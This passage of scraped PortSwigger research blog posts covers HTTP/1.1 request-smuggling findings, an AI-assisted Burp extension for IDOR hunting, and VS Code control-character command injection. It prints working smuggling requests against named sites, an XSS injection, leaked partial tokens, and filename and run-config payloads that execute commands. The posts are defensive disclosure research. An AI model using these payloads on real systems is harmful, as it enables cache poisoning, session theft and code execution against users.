x/x\nHTTP/1.1 200 OK\nXost: x/x\nHTTP/1.1 412 Precondition Failed\nThis target was once again straightforward to exploit using a CL.0 desync. In my experience, web VPNs often have flawed HTTP implementations and I would strongly advise against placing one behind any kind of reverse proxy.\nThe discrepancy-detection approach can also identify servers that deviate from accepted parsing conventions and are, therefore, likely to be vulnerable if placed behind a reverse proxy. For example, scanning a <redacted> server revealed that they don't treat \\n\\n as terminating the header block:\nPOST / HTTP/1.1\\r\\n\nContent-Length: 22\\r\\n\nA: B\\r\\n\n\\nExpect: 100-continue\\r\\n\nHTTP/1.1 100 Continue\nHTTP/1.1 302 Found\nServer: <redacted>\nThis is harmless for direct access, but RFC-9112 states \"a recipient MAY recognize a single LF as a line terminator\". Behind such a front-end, this would be exploitable. This vulnerability was traced back to the underlying HTTP library, and a patch is on the way. Reporting theoretical findings like these is unlikely to net you sizeable bug bounty payouts, but could potentially do quite a lot to make the ecosystem more secure.\nHTTP Request Smuggler also identified a large number of vulnerable systems using Microsoft IIS behind AWS Application Load Balancer (ALB). This is useful to understand because AWS isn't planning to patch it. The detection typically shows up like:\nHost: foo/bar\n400, Server; awselb/2.0\nXost: foo/bar\n200, -no server header-\nHost : foo/bar\n400, Server: Microsoft-HTTPAPI/2.0\nXost : foo/bar\n200, -no server header-\nAs you can infer from the server banners, this is a H-V discrepancy: when the malformed Host header is obfuscated, ALB doesn't see it and passes the request through to the back-end server.\nThe classic way to exploit a H-V discrepancy is with a CL.TE desync, as the Transfer-Encoding header usually takes precedence over the Content-Length, but this gets blocked by AWS' Desync Guardian. I decided to shelve the issue to focus on other findings, then Thomas Stacey independently discovered it, and bypassed Desync Guardian using an H2.TE desync.\nEven with the H2.TE bypass fixed, attackers can still exploit this to smuggle headers, enabling IP-spoofing and sometimes complete authentication bypass.\nI reported this issue to AWS, and it emerged that they were already aware but chose not to patch it because they don't want to break compatibility with ancient HTTP/1 clients sending malformed requests. You can patch it yourself by changing two settings:\nSet routing.http.drop_invalid_header_fields.enabled\nSet routing.http.desync_mitigation_mode = strictest\nThis unfixed finding exposes an overlooked danger of cloud proxies: adopting them imports another company's technical debt directly into your own security posture.\nThe next major breakthrough in this research came when I discovered a H-V discrepancy on a certain website which blocks all requests containing Transfer-Encoding, making CL.TE attacks impossible. There was only one way forward with this: a 0.CL desync attack.\n0.CL desync attacks are widely regarded as unexploitable. To understand why, consider what happens when you send the following attack to a target with a H-V parser discrepancy:\nGET /Logon HTTP/1.1\nHost: <redacted>\nContent-Length:\n7\nGET /404 HTTP/1.1\nX: Y\nThe front-end doesn't see the Content-Length header, so it will regard the orange payload as the start of a second request. This means it buffers the orange payload, and only forwards the header-block to the back-end:\nGET /Logon HTTP/1.1\nHost: <redacted>\nContent-Length:\n7\nHTTP/1.1 504 Gateway Timeout\nThe back end does see the Content-Length header, so it will wait for the body to arrive. Meanwhile, the front-end will wait for the back-end to reply. Eventually, one of the servers will time out and reset the connection, breaking the attack. In essence, 0.CL desync attacks usually result in an upstream connection deadlock.\nPrior to this research, I spent two years exploring race conditions and timing attacks. In the process, I stumbled on a solution for the 0.CL deadlock.\nWhenever I tried to use the single-packet attack on a static file on a target running nginx, nginx would break my timing measurement by responding to the request before it was complete. This required a convoluted workaround at the time, but hinted at a way to make 0.CL exploitable.\nThe key to escaping the 0.CL deadlock is to find an early-response gadget: a way to make the back-end server respond to a request without waiting for the body to arrive. This is straightforward on nginx, but my target was running IIS, and the static file trick didn't work there. So, how can we persuade IIS to respond to a request without waiting for the body to arrive? Let's take a look at my favourite piece of Windows documentation:\nDo not use the following reserved names for the name of a file:\nCON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7...\nIf you try to access a file or folder using a reserved name, the operating system will throw an exception for amusing legacy reasons. We can make a server hit this quirk simply by requesting 'con' inside any folder that's mapped to the filesystem.\nI found that if I hit /con on the target website, IIS would respond without waiting for the body to arrive, and helpfully leave the connection open. When combined with the CL.0 desync, this would result in it interpreting the start of the second request as the body of the first request, triggering a 400 Bad Request response. Here's the view from the user's perspective:\nGET /con HTTP/1.1\nHost: <redacted>\nContent-Length:\n7\nHTTP/1.1 200 OK\nGET / HTTP/1.1\nHost: <redacted>\nHTTP/1.1 400 Bad Request\nAnd the view on the back-end connection:\nGET /con HTTP/1.1\nHost: <redacted>\nContent-Length:\n7\nGET / HTTP/1.1\nHost: <redacted>\nI've known about the /con quirk for over ten years but this was the first time I've been able to actually make use of it! Also, over the last six years, I've seen so many suspicious 'Bad request' responses, I actually made HTTP Request Smuggler report them with the cryptic title Mystery 400. This was the moment when I realised they were probably all exploitable.\nOn other servers, I found server-level redirects operated as early-response gadgets. However, I never found a viable gadget for Apache; they're too studious about closing the connection when they hit an error condition.\nTo prove you've found a 0.CL desync, the next step is to trigger a controllable response. After the attack request, send a 'victim' request containing a second path nested inside the header block:\nGET /con HTTP/1.1\nHost: <redacted>\nContent-Length:\n20\nHTTP/1.1 200 OK\nGET / HTTP/1.1\nX: yGET /wrtz HTTP/1.1\nHost: <redacted>\nHTTP/1.1 302 Found\nLocation: /Logon?ReturnUrl=%2fwrtz\nIf you set the Content-Length of the first request correctly, it will slice the initial bytes off the victim request, and you'll see a response indicating that the hidden request line got processed.\nThis is sufficient to prove there's a 0.CL desync, but it's obviously not a realistic attack - we can't assume our victim will include a payload inside their own request! We need a way to add our payload to the victim's request. We need to convert our 0.CL into a CL.0.\nTo convert 0.CL into CL.0, we need a double-desync! This is a multi-stage attack where the attacker uses a sequence of two requests to set the trap for the victim:\nThe cleanest way to achieve this would be to have the 0.CL cut the entire header block off the first request:\nPOST /nul HTTP/1.1\nContent-length:\n163\nPOST / HTTP/1.1\nContent-Length: 111\nGET / HTTP/1.1\nHost: <redacted>\nGET /wrtz HTTP/1.1\nFoo: bar\nUnfortunately, this is not as easy as it looks. You need to know the exact size of the second request header block, and virtually all front-end servers append extra headers. On the back-end, the request sequence above ends up looking like:\nPOST /nul HTTP/1.1\nContent-length:\n163\nGET / HTTP/1.1\nContent-Length: 111\n??????: ???????????\n--connection terminated--\nYou can discover the length of the injected headers using the new 0cl-find-offset script for Turbo Intruder, but these often contain things like the client IP, which means the attack works for you but breaks when someone else tries to replicate it. This makes bug bounty triage painful.\nAfter a lot of pain, I discovered a better way. Most servers insert headers at the end of the header block, not at the start. So, if our smuggled request starts before that, the attack will work reliably! Here's an example that uses an input reflection to reveal the inserted header:\nPOST /nul HTTP/1.1\nContent-length:\n92\nHTTP/1.1 200 OK\nGET /z HTTP/1.1\nContent-Length: 180\nFoo: GET /y HTTP/1.1\n???: ???? // front-end header lands here\nPOST /index.asp HTTP/1.1\nContent-Length: 201\n<redacted>=zwrt\nHTTP/1.1 200 OK\nGET / HTTP/1.1\nHost: <redacted>\nInvalid input\nzwrtGET / HTTP/1.1\nHost:<redacted>\nConnection:keep-alive\nAccept-Encoding:identity\nFrom this point, we can use traditional CL.0 exploit techniques. On this target, I used the HEAD technique to serve malicious JavaScript to random users:\nPOST /nul HTTP/1.1\nHost: <redacted>\nContent-length:\n44\nHTTP/1.1 200 OK\nGET /aa HTTP/1.1\nContent-Length: 150\nFoo: GET /bb HTTP/1.1\nHost: <redacted>\nHEAD /index.asp HTTP/1.1\nHost: <redacted>\nGET /?<script>alert(1 HTTP/1.1\nX: Y\nHTTP/1.1 200 OK\nLocation: /Logon?returnUrl=/bb\nGET / HTTP/1.1\nHost: <redacted>\nHTTP/1.1 200 OK\nContent-Length: 56670\nContent-Type: text/html\nHTTP/1.1 302 Found\nLocation: /Logon?returnUrl=/<script>…\nYou can experiment with this technique yourself for free using our new Web Security Academy lab 0.CL Request Smuggling.\nUsing these techniques, we initially identified around ten simple 0.CL vulnerabilities in websites with bug bounty programs. Many of these findings were on websites using a certain cloud WAF - this is not the first time we've seen a WAF making a website easier to hack. We were distracted by other discoveries at this point and didn't bother to weaponize any of the attacks beyond a DoS, so this only took the total bounties earned to $21,645. The best bounty experience was with EXNESS who awarded $7,500. As usual, the most valuable outcome wasn't the bounties themselves - it was the foundation this work provided for our subsequent findings.\nAt this point, I thought the desync threat was finally fully mapped and future issues would be niche, one-off implementation flaws. This is a mistake I make every year. Here's a partial history of major advances in request smuggling:\nIt took the next discovery for me to finally realise the truth - more desync attacks are always coming.\nBack in 2022, I tried out using the Expect header for desync attacks but didn't find anything. As it turns out, I didn't look hard enough.\nThis time around, I first started using the Expect header while looking for a way to detect 0.CL desync vulnerabilities without an early-response gadget.\nThe Expect header is an ancient optimisation that splits sending a single HTTP request into a two-part process. The client sends the header block containing Expect: 100-continue, and the server evaluates whether the request would be accepted. If the server responds with HTTP/1.1 100 Continue, the client is then permitted to send the request body.\nThis is complex for both clients and servers, and significantly worse for reverse proxies. Consider what happens if the front-end doesn't support Expect, or see the header, or parse the value as 100-continue. What about the back-end? What if the back-end responds early, or the client doesn't wait for 100-continue?\nThe first explicit clue that the Expect header is something special was that it broke the HTTP client in my Turbo Intruder tool, at a critical point where any bug could lead to a desync. Fixing the client massively increased the code complexity. Here's the code to read the response off the wire before:\nAnd after:\nExpect breaks servers too. On one site, Expect made the server forget that HEAD responses don't have a body and try to read too much data from the back-end socket, causing an upstream deadlock:\nHEAD /<redacted> HTTP/1.1\nHost: api.<redacted>\nContent-Length: 6\nExpect: 100-continue\nABCDEF\nHTTP/1.1 100 Continue\nHTTP/1.1 504 Gateway Timeout\nThat was interesting but relatively harmless - it only posed a DoS risk. Other misbehaviours are less harmless, such as the multiple servers that respond to Expect by disclosing memory. This yielded mysterious fragments of text:\nPOST / HTTP/1.1\nHost: <redacted>\nExpect: 100-continue\nContent-Length: 1\nX\nHTTP/1.1 404 Not Found\nHTTP/1.1 100 Continue\nd\nAsk the hotel which eHTTP/1.1 404 Not Found\nHTTP/1.1 100 Continue\nd\nAnd secret keys:\nPOST / HTTP/1.1\nHost: <redacted>\nExpect: 100-continue\nContent-Length: 1\nX\nHTTP/1.1 401 Unauthorized\nWww-Authenticate: Bearer\nHTTP/1.1 100 ContinTransfer-EncodingzxWthTQmiI8fJ4oj9fzE\"\nX-: chunked\nHTTP/1.1 401 Unauthorized\nWww-Authenticate: Bearer\nHTTP/1.1 100 ContinTransfer-EncodingzxWthTQm145\nAll HTTP/1.1 responses have one header block - unless you send Expect. As a result, the second header block often takes parsers by surprise and breaks attempts from front-end servers to remove sensitive response headers. Here's an example:\nPOST /_next/static/foo.js HTTP/1.1\nHost: app.netlify.com\nHTTP/1.1 200 OK\nServer: Netlify\nX-Nf-Request-Id: <redacted>\nPOST /_next/static/foo.js HTTP/1.1\nHost: app.netlify.com\nExpect: 100-continue\nHTTP/1.1 100 Continue\nServer: Netlify\nX-Nf-Request-Id: <redacted>\nHTTP/1.1 200 OK\nX-Bb-Account-Id: <redacted>\nX-Bb-Cache-Gen: <redacted>\nX-Bb-Deploy-Id: <redacted>\nX-Bb-Site-Domain-Id: <redacted>\nX-Bb-Site-Id: <redacted>\nX-Cnm-Signal-K: <redacted>\nX-Nf-Cache-Key: <redacted>\nX-Nf-Ats-Version: <redacted>\nX-Nf-Cache-Info: <redacted>\nX-Nf-Cache-Result: <redacted>\nX-Nf-Proxy-Header-Rewrite:<redacted>\nX-Nf-Proxy-Version: <redacted>\nX-Nf-Srv-Version: <redacted>\nI reported this example to Netlify and they said \"this information is provided by design\".\nThis technique also reveals hundreds of server/version banners that people have attempted to mask in an attempt to mitigate targeted exploits. Luckily, exposed server banners are more of a threat to compliance than anything critical.\nAround this time, I received a message from a small team of full-time bounty hunters - Paolo 'sw33tLie' Arnolfo, Guillermo 'bsysop' Gregorio, and Mariani 'Medusa' Francesco. They had also noticed the Expect header making interesting things happen. They had a solid research pedigree - their exploration of TE.0 Request Smuggling landed third in the Top Ten Web Hacking Techniques of 2024. As such, we decided to team up.\nWe ended up exploiting many, many targets. Our findings fell into four broad categories:\nSimply sending a valid Expect header causes a 0.CL desync on numerous different servers. I believe this is caused by a broken Expect implementation in the front-end server, which makes it correctly forward the headers, but get confused by the back-end's non-100 reply and forget it still needs to receive a body from the client.\nHere's a proof of concept we built targeting a T-Mobile staging domain:\nGET /logout HTTP/1.1\nHost: <redacted>.t-mobile.com\nExpect: 100-continue\nContent-Length: 291\nHTTP/1.1 404 Not Found\nGET /logout HTTP/1.1\nHost: <redacted>.t-mobile.com\nContent-Length: 100\nGET / HTTP/1.1\nHost: <redacted>.t-mobile.com\nGET https://psres.net/assets HTTP/1.1\nX: y\nHTTP/1.1 200 OK\nGET / HTTP/1.1\nHost: <redacted>.t-mobile.com\nHTTP/1.1 301 Moved Permanently\nLocation: https://psres.net/…\nT-Mobile awarded us $12,000 for this finding - a highly competitive payout for a non-production domain.\nSending a lightly obfuscated Expect header exposes a substantial number of new targets. For example, \"Expect: y 100-continue\" causes a 0.CL desync on h1.sec.gitlab.net. This was an interesting target as it holds the attachments to reports sent to Gitlab's bug bounty program - potentially critical zerodays.\nThe site had a tiny attack surface so we weren't able to find a classic redirect or XSS desync gadget for exploitation. Instead, we opted to shoot for Response Queue Poisoning (RQP) - a high-impact attack which results in the server sending everyone random responses intended for other users. RQP is tricky on low-traffic targets due to an inherent race condition, but we persisted and 27,000 requests later we got access to someone else's vulnerability report video and a $7,000 bounty:\nGET / HTTP/1.1\nContent-Length: 686\nExpect: y 100-continue\nHTTP/1.1 200 OK\nGET / HTTP/1.1\nContent-Length: 292\nGET / HTTP/1.1\nHost: h1.sec.gitlab.net\nGET / HTTP/1.1\nHost: h1.sec.gitlab.net\nHTTP/1.1 200 OK\nGET /??? HTTP/1.1\nAuthorization: ???\nUser-Agent: Unknown Gitlab employee\nHTTP/1.1 200 OK\nGET / HTTP/1.1\nHost: h1.sec.gitlab.net\nHTTP/1.1 302 Found\nLocation: https://storage<redacted>\nAfter this, some high-end payouts took us to around $95,000 earned from 0.CL Expect-based desync attacks.\nProving that it can break servers in every possible way, Expect can also cause CL.0 desync vulnerabilities.\nFor example, we found a CL.0 RQP vulnerability in Netlify that, when triggered, send us a continuous stream of responses from every website on the Netlify CDN:\nPOST /images/ HTTP/1.1\nHost: <redacted-netlify-client>\nExpect: 100-continue\nContent-Length: 64\nGET /letter-picker HTTP/1.1\nHost: <redacted-netlify-client>\nHTTP/1.1 404 Not Found\nPOST /authenticate HTTP/1.1\nHost: ???\nUser-Agent: Unknown Netlify user\nHTTP/1.1 200 OK\n…\n<title>Letter Picker Wheel\nGET / HTTP/1.1\nHost: <redacted-netlify-client>\nHTTP/1.1 200 OK\n…\n\"{\\\"token\\\":\\\"eyJhbGciOiJ…\nWe found this while testing a particular Netlify-hosted website, but it didn't make sense to report it to them as the responses we hijacked were all coming from third-party websites.\nThe attack stopped working shortly after we found it, but we reported it to Netlify anyway and received the reply \"Websites utilizing Netlify are out of scope\", and no bounty. Normally, when I encounter a surprising bounty outcome, I don’t mention it as it tends to distract readers from the technical content. I’ve made an exception here because it provides useful context for what happened next.\nUnsurprisingly, obfuscating the Expect header revealed even more CL.0 desync vulnerabilities. Here's an example we found that let us serve arbitrary content to users accessing auth.lastpass.com, netting their maximum bounty - $5,000:\nOPTIONS /anything HTTP/1.1\nHost: auth.lastpass.com\nExpect:\n100-continue\nContent-Length: 39\nGET / HTTP/1.1\nHost: www.sky.com\nX: X\nHTTP/1.1 404 Not Found\nGET /anything HTTP/1.1\nHost: auth.lastpass.com\nHTTP/1.1 200 OK\nDiscover TV & Broadband Packages with Sky\nWe quickly realised this affected a large number of targets using the Akamai CDN. In fact, I believe we could have used it to take control of possibly the most prestigious domain on the internet - example.com! Unfortunately, example.com doesn't have a VDP, so validating this would have been illegal. Unless Akamai informs us, we'll probably never know for certain.\nStill, this raised a question. Should we report the issue directly to affected companies, or to Akamai? As a researcher, maintaining a good relationship with both CDNs and their customers is really important, and any bounties I earn go to charity so I don't have a personal stake. However, I could see that the bounty hunters would have discovered the issue independently without my help, and didn't want to sabotage their income. Ultimately, I decided to step back - I didn't get involved in exploring or reporting the issue, and didn't take a cut of the bounties. Part of me regrets this a little because it ultimately resulted in 74 separate bounties, totalling $221,000.\nThe reports were well received, but things didn't go entirely smoothly. It transpired that the vulnerability was actually fully inside Akamai's infrastructure, so Akamai was inundated with support tickets from their clients. I became concerned that the technique might leak while Akamai was still vulnerable, and reached out to Akamai to help them fix it faster. The issue was assigned CVE-2025-32094, and I was awarded a $9,000 bounty. They were able to release a hotfix for some customers quickly, but it still took 65 days from that point to fully resolve the vulnerability.\nOverall, it was quite stressful, but at least I got some USD-backed evidence of the danger posed by HTTP/1.1. The total bounties earned from this research so far currently stands at slightly over $350,000.\nAll the attacks in this paper are exploiting implementation flaws, so it might seem strange to conclude that the solution is to abandon the entire protocol. However, all these attacks have the same root cause. HTTP/1.1's fatal flaw - poor request separation - means tiny bugs often have critical impact. This is compounded by two key factors.\nFirst, HTTP/1.1 is only simple if you're not proxying. The RFC contains numerous landmines like the three different ways of specifying the length of a message, complexity bombs like Expect and Connection, and special-cases like HEAD. These all interact with each-other, and parser discrepancies, to create countless critical vulnerabilities.\nSecond, the last six years have proven that we struggle to apply the types of patching and hardening that would truly resolve the threat. Applying robust validation or normalisation on front-end servers would help, but we're too afraid of breaking compatibility with legacy clients to do this. Instead, we resort to regex-based defences, which attackers can easily bypass.\nAll these factors combine to mean one thing - more desync attacks are coming.\nHTTP/2 is not perfect - it's significantly more complex than HTTP/1, and can be painful to implement. However, upstream HTTP/2+ makes desync vulnerabilities vastly less likely. This is because HTTP/2 is a binary protocol, much like TCP and TLS, with zero ambiguity about the length of each message. You can expect implementation bugs, but the probability that a given bug is actually exploitable is significantly lower.\nMost vulnerabilities found in HTTP/2 implementations to date are DoS flaws such as HTTP/2 Rapid Reset - an attack class that HTTP/1 has its fair share of. For a more serious vulnerability, you would typically need a memory safety issue or integer overflow as a root cause. Once again, these issues affect HTTP/1.1 implementations too. Of course, there's always exceptions - like CVE-2023-32731 and HTTP/3 connection contamination - and I look forward to seeing more research targeting these in the future.\nNote that HTTP/2 downgrading, where front-end servers speak HTTP/2 with clients but rewrite it as HTTP/1.1 for upstream communication, provides minimal security benefit and actually makes websites more exposed to desync attacks.\nYou might encounter an argument stating that HTTP/1.1 is more secure than HTTP/2 because HTTP/1.1 implementations are older, and therefore more hardened. To counter this, I would like to draw a comparison between request smuggling, and buffer overflows. Request smuggling has been a well known threat for roughly six years. This means our defences against it are roughly as mature as our defences against buffer overflows were in 2002. It's time to switch to a memory safe language.\nFirst, ensure your origin server supports HTTP/2. Most modern servers do, so this shouldn't be a problem.\nNext, toggle upstream HTTP/2 on your proxies. I've confirmed this is possible on the following vendors: HAProxy, F5 Big-IP, Google Cloud, Imperva, Apache (experimental), and Cloudflare (but they use HTTP/1 internally).\nUnfortunately, the following vendors have not yet added support for upstream HTTP/2: nginx, Akamai, CloudFront, Fastly. Try raising a support ticket asking when they'll enable upstream HTTP/2 - hopefully they can at least provide a timeline. Also, have a look through their documentation to see if you can enable request normalisation - sometimes valuable mitigations are available but disabled by default.\nNote that disabling HTTP/1 between the browser and the front-end is not required. These connections are rarely shared between different users and, as a result, they're significantly less dangerous. Just ensure they're converted to HTTP/2 upstream.\nIf you're currently stuck with upstream HTTP/1.1, there are some strategies you can use to try and help your website survive the inevitable future rounds of desync attacks until you can start using HTTP/2.\nFinally, please be wary of vendor claims that WAFs can thwart desync attacks as effectively as upstream HTTP/2.\nRight now, the biggest barrier to killing upstream HTTP/1 is poor awareness of how dangerous it is. Hopefully this research will help a bit, but to make a lasting difference and ensure we're not in exactly the same place in six years time, I need your help.\nWe need to collectively show the world how broken HTTP/1.1 is. Take HTTP Request Smuggler 3.0 for a spin, hack systems and get them patched with HTTP/2. Whenever possible, publish your findings so the rest of us can learn from it. Don't let targets escape you just by patching the methodology - adapt and customise techniques and tools, and never settle for the state of the art. It's not as hard as you think, and you definitely don't need years of research experience. For example, while wrapping this research up I realised a writeup published last year actually describes an Expect-based 0.CL desync, so you could have beaten me to these findings just by reading and applying that!\nFinally, share the message - more desync attacks are always coming.\nOver the last six years, we've seen that a design flaw in HTTP/1.1 regularly exposes websites to critical attacks. Attempts to hotfix individual implementations have failed to keep pace with the threat, and the only viable long-term solution is upstream HTTP/2. This is not a quick fix, but by spreading awareness just how dangerous upstream HTTP/1.1 really is, we can help kill HTTP/1.1.\nGood luck!\nJames Kettle", "timestamp": "2025-10-21T13:33:03.820948"}
{"source": "blog", "feed": "https://portswigger.net/research/rss", "title": "Repeater Strike: manual testing, amplified", "url": "https://portswigger.net/research/repeater-strike-manual-testing-amplified", "published": "Tue, 15 Jul 2025 13:46:37 GMT", "content": "Published: 15 July 2025 at 13:46 UTC\nUpdated: 15 July 2025 at 13:46 UTC\nManual testing doesn't have to be repetitive. In this post, we're introducing Repeater Strike - a new AI-powered Burp Suite extension designed to automate the hunt for IDOR and similar vulnerabilities. By analyzing your Repeater traffic, Repeater Strike generates smart regular expressions based on the requests and responses you're testing. It then applies these regexes across your proxy history to uncover related issues, letting you turn a single vulnerability into a broader set of actionable findings with minimal effort.\nAt PortSwigger research we're experimenting with AI to produce semi-automated tools that help enhance your security testing. One of the ideas I had was to use AI to find variations and so I built Shadow Repeater . This turned out to be quite cool and it fit nicely into what AI is good at. I wondered if I could do more than just generate variations. I had a thought of taking what you do in Repeater and scanning your proxy history to discover more of it.\nI experimented with three different methods of finding the vulnerability: Java compilation, regular expression and differential based analysis. I spent some time generating scan checks using a dynamically generated Java class but soon realised that you use multiple regular expressions to accomplish the same thing. I turned my focus to regexes instead.\nThe first step was to use the AI to identify the vulnerability and produce a JSON object to help the next agent:\n\"param\": {\n\"values\": [\"wiener\"],\n\"name\": \"id\",\n\"type\": \"URL\",\n\"vulnerabilityClass\": \"IDOR\"\n}\nThe AI correctly identified what you may be testing for and noticed that based on the requests you sent to it you are testing the URL with a parameter called id. The initial probe was to probe for wiener 😂. The AI then takes this probe and tries to find something uniquely identifiable in the response:\n\"responseRegexes\": [[\n\"Your username is: wiener\",\n\"Your API Key is: [A-Za-z0-9]{32}\",\n\"<a href=\\\"/my-account\\\\?id=wiener\\\">My account<\\/a>\"\n]]\nPretty cool the AI has identified the username reflection and the API key and I told it to match the structure of the data so it can find more rather than the specific key. Now it tries to reproduce the finding by making the request with the probe before it generates the new Strike Rule. If the replication was successful, Repeater Strike then prompts you for a Strike Rule name.\nThe next step is to mutate the probes and response regexes. This wouldn't have been possible a year ago but now the AI models are super smart. They can take the data and mutate it very cleverly. It's worth noting that I haven't told it specific instructions about the vulnerability it can work it out from the JSON structure I gave to it:\n{\n\"mutatedProbesToUse\": [\n\"admin\",\n\"testuser\",\n\"anonymous\",\n\"user123\",\n...\n],\n\"mutatedResponsesRegexes\": [\n[\n\"Your username is: admin\",\n\"Your API Key is: [A-Za-z0-9]{32}\",\n\"<a href=\\\"/my-account\\\\?id=admin\\\">My account<\\/a>\"\n],\n[\n\"Your username is: testuser\",\n\"Your API Key is: [A-Za-z0-9]{32}\",\n\"<a href=\\\"/my-account\\\\?id=testuser\\\">My account<\\/a>\"\n],\n[\n\"Your username is: anonymous\",\n\"Your API Key is: [A-Za-z0-9]{32}\",\n\"<a href=\\\"/my-account\\\\?id=anonymous\\\">My account<\\/a>\"\n],\n[\n\"Your username is: user123\",\n\"Your API Key is: [A-Za-z0-9]{32}\",\n\"<a href=\\\"/my-account\\\\?id=user123\\\">My account<\\/a>\"\n],\n...\n}\nOnce the AI has mutated the probes and regexes, it can then scan your proxy history looking for this behaviour. You can even set up Repeater Strike to dynamically create Strike Rules on every Repeater request sent. You might expect this to burn through a load of AI tokens but actually to create this particular Strike Rule it only cost me 61 tokens and once the rule has been generated it uses no further tokens!\nIf the AI generated regular expressions failed, no problem I created a Strike Rule editor that lets you edit the generated Strike Rule, hit save and then scan your proxy history all without further tokens.\nDuring development, I ran into several challenges. One of the major issues was handling large responses - while the AI could interpret smaller ones effectively, it struggled with longer responses from sites like Facebook. I initially truncated the data, but this led to important context being lost.\nAnother hurdle was inconsistent output from the AI. For example, when generating regular expressions, it sometimes failed to properly escape metacharacters, leading to runtime errors. A workaround was to programmatically escape these characters when exceptions occurred.\nThe broader concept also proved difficult to generalise too. While the system could detect issues like IDOR on specific sites, it was hard to create regular expression patterns flexible enough to work across different sites without being too site-specific.\nI experimented with response diffing as a way to extract meaningful information by filtering out noise - such as insignificant headers - and focusing only on the parts that change.\nIn the end I ran out of time to fully solve it - but maybe you can.\nCan you find an elegant solution to reliably isolate meaningful UI changes and feed them to the AI? Let's push this further.\nI hope I've inspired you to create your own Burp AI extensions. It really is super easy to get started. If you need help on how to use Repeater Strike please consult the readme .\nPlease note to use this extension you need to be on the Early Adopter channel. It is currently considered experimental and is far from a finished product.", "timestamp": "2025-10-21T13:33:04.922053"}
{"source": "blog", "feed": "https://portswigger.net/research/rss", "title": "Drag and Pwnd: Leverage ASCII characters to exploit VS Code", "url": "https://portswigger.net/research/drag-and-pwnd-leverage-ascii-characters-to-exploit-vs-code", "published": "Wed, 30 Apr 2025 12:37:11 GMT", "content": "Published: 30 April 2025 at 12:37 UTC\nUpdated: 01 May 2025 at 12:27 UTC\nControl characters like SOH\n, STX\n, EOT\nand ETX\nwere never meant to run your code - but in the world of modern terminal emulators, they sometimes do. In this post, I'll dive into the forgotten mechanics of ASCII’s transport control characters, how they shaped early computing, and how they're now being abused in real-world vulnerabilities affecting modern applications.\nBefore GUI-based IDEs and fancy fonts, computers talked over serial lines - character by character. To keep those conversations structured, ASCII introduced a set of Communication Control Characters: invisible byte codes used to delimit and manage message flows between systems.\nA typical message followed a strict structure:\nSOH → Header → STX → Body → ETX\nThough their original purpose was communication control, many of these characters persist today - repurposed by modern software.\nThe Readline library (used by Bash and other interactive shells) reuses several control characters values for line editing:\nThere are many other Readline shortcuts (Ctr + e, Ctr + k, Ctr + l, etc.) - see the Readline man page for more. Remember that on MacOS, you need to press the Control key, not the Command key.\nFast forward to today. Applications like Visual Studio Code use node-pty to simulate pseudo-terminals inside JavaScript environments. That forwards raw bytes directly to a shell, trusting that everything downstream will \"do the right thing\".\nThat trust breaks when control characters come into play.\nIn Visual Studio Code, you can define custom run configurations under Run → Add Configuration\n. These configurations often include an args array. During my previous research, I found an interesting variant of the OS command injection vulnerability: inserting a [ \\x01 ] SOH character into arguments causes the shell to split and misinterpret them. Let's examine the following test configuration file:\n{\"args\": [\"hello\",\"\\u0001\\t--args\\u0001\\tCalculator\\u0001\\t-a\\u0001open\\t\"]}\nInstead of running a Python script, Visual Studio Code opens the Calculator application on MacOS:\nopen -a Calculator --args cd /tmp/; /usr/bin/env /opt/homebrew/bin/python3 script.py hello\nIt works on Ubuntu too; use gnome-calculator instead.\nWhy this works\nTake a look at the VT100 User Guide, 1979 by Digital Equipment Corporation that shows how control character can be encoded using keyboard shortcuts:\nAs you already know, node-pty reads and sends raw bytes directly to a shell. Whenever Visual Studio Code sees byte [ \\x01 ] SOH, it moves the cursor to the beginning of the line (Ctr + a).This action is repeated four times in the given example to build the payload in reverse and launch the Calculator app.\nWhile adding malicious arguments to the run configuration is an unusual use case, the issue can occur with other user-controlled inputs, such as filenames - anywhere node-pty blindly passes data to the shell. This is especially concerning in cases like file drag-and-drop. By default, terminal applications print the full path to the file if it was drag-and-dropped into the window. Imagine, a file with malicious payload hidden inside the name:\nvery very very long name \\x03 open -a Calculator \\x0d.txt\nWhat the Visual Studio Code terminal sees:\n'very very very long name [ Ctr + c: ignore line ]\nopen -a Calculator [ Enter ]\n.txt'\nBe aware that when a file is dragged and dropped, the carriage return character [\\x0d] automatically executes a command. This prevents the user from examining the potentially harmful input in the terminal window.\nThis vulnerability affects any operating system that permits control characters in filenames. I successfully reproduced the issue on both macOS and Ubuntu. On Windows, the risk is mitigated by two factors: the filesystem disallows control characters in filenames, and Visual Studio Code defaults to PowerShell, which does not interpret control characters as cursor movements or command breaks. Interestingly, the default macOS Terminal shows a warning when dragging files with special characters, and Ubuntu’s built-in terminal escapes control characters automatically during drag-and-drop.\nHere's an escaping function that looks safe - but this technique bypasses it effortlessly.\nconst shellEscape = (arg: string): string => {\nif (/[^A-Za-z0-9_\\/:=-]/.test(arg))\nreturn arg.replace(/([$!'\"();`*?{}[\\]<>&%#~@\\\\ ])/g, '\\\\$1')\nreturn arg\n}\nWhile I have demonstrated this vulnerability in Node.js applications using node-pty, the underlying issue lies in how applications communicate with the terminal. Any web application that blindly passes raw bytes into a terminal without proper control characters sanitization is potentially vulnerable - regardless of the underlying language, framework, or runtime environment.\nI submitted this vulnerability to the Microsoft Security Response Center; however, they do not consider it a security issue. According to their assessment, existing mitigations - such as workspace trust warnings and the requirement for significant user interaction - lower the severity.\nSo, be careful next time you drag and drop a file from untrusted sources into your terminal app.\nWe've integrated the most effective of these techniques into the Active Scan++ extension for Burp Suite. To explore or test them yourself, simply install or update the extension directly from the Github.\nIf you're interested in command injection research, don’t miss:\nIf you'd like to test your new knowledge, I’ve prepared a tiny Proof of Concept project for you. Your mission: read the contents of the flag.txt\nfile located in the /app\ndirectory.\nHave fun!", "timestamp": "2025-10-21T13:33:05.830865"}
